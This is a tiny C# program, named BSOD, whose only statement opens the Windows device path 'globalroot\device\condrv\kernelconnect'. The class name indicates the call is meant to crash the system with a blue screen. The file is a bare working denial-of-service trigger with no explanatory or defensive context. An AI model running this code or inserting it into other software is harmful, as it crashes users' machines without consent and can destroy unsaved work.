using System.IO;

public class BSOD
{
	public static void Main()
	{
		File.Open("\\\\.\\globalroot\\device\\condrv\\kernelconnect", FileMode.Open, FileAccess.Read);
	}
}